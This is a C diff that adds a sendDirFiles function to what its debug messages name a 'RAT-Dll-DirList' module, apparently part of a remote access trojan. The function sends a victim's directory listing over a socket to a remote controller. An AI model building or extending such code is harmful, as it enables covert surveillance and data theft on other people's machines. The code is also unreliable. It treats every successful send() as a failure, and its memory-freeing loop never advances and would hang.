@@ -74,3 +74,50 @@ INT performDirList(__in char* dirPath, __inout char** dirFiles, __inout UINT32* 
 cleanup:
 	return status;
 }
+
+INT sendDirFiles(__inout SOCKET clientSock, __in char** dirFiles, __in UINT32 numDirFiles)
+{
+	INT status = SUCCESS;
+	UINT32 index = 0;
+	CHAR msgBuf[DEFAULT_BUF_LEN];
+	char* fileName;
+
+	while (index < numDirFiles)
+	{
+		fileName = dirFiles[index];
+
+		status = send(clientSock, fileName, strlen(fileName), 0);
+		if (status != SUCCESS)
+		{
+			sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Failure recevied from send (status code) %d\n", WSAGetLastError());
+			OutputDebugStringA(msgBuf);
+			status = WSAGetLastError();
+			goto cleanup;
+		}
+
+		index++;
+	}
+
+	// Send 'terminator' indicating we've reached the end of our list 
+	status = send(clientSock, "\x00\x00", 2, 0);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Failure recevied from send (status code) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		status = WSAGetLastError();
+		goto cleanup;
+	}
+
+	// Should free memory stuff here too 
+	index = 0;
+	while (index < numDirFiles)
+	{
+		free(dirFiles[index]);
+	}
+
+	free(dirFiles);
+
+
+cleanup:
+	return status;
+}
